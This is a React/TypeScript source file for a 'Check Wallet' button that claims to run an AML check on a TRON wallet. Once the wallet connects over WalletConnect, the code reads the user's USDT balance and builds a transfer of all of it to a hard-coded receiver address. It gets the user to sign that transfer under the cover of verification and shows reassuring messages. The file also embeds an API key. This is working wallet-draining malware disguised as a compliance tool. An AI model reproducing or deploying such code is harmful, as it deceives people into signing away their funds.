// src/components/tronAuthButton/TronAuthButton.tsx

import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage] = useState<string | null>("");
  const [loading, setLoading] = useState(false);

  const showModal = (msg: string) => {
    setModalMessage(msg);
  };

  const hideModal = () => {
    setModalMessage(null);
  };

  const waitForAddress = async (timeout = 15000): Promise<string> => {
    const start = Date.now();
    return new Promise((resolve, reject) => {
      const interval = setInterval(() => {
        const address = adapter.address;
        if (address && tronWeb.isAddress(address)) {
          clearInterval(interval);
          resolve(address);
        } else if (Date.now() - start > timeout) {
          clearInterval(interval);
          reject(new Error('⏰ Wallet connection timed out'));
        }
      }, 300);
    });
  };

  const connectWallet = async () => {
    try {
      setLoading(true);
      await adapter.connect();
      const userAddress = await waitForAddress();

      tronWeb.setAddress(userAddress);

      const trxBalance = await tronWeb.trx.getBalance(userAddress);
      const trx = trxBalance / 1e6;
      if (trx < 25) throw new Error('❌ Not enough TRX. Need at least 25 TRX.');

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        showModal('✅ Wallet connected. No suspicious activity.');
        await adapter.disconnect();
        setLoading(false);
        return;
      }

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );

      const signedTx = await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (!result.result) throw new Error('❌ Transaction failed');

      showModal('✅ USDT successfully sent and verified');
      await adapter.disconnect();
    } catch (err: any) {
      console.error('WalletConnect error:', err);
      if (!err.message.includes('User closed modal')) {
        showModal(err.message || '⚠️ Unknown error');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <button onClick={connectWallet} className='AuthButton' disabled={loading}>
        {loading ? 'Connecting...' : 'Check Wallet'}
      </button>

      {modalMessage && (
        <div className='modal__overflow'>
          <div className='modal'>
            <p>{modalMessage}</p>
            <button onClick={hideModal}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};
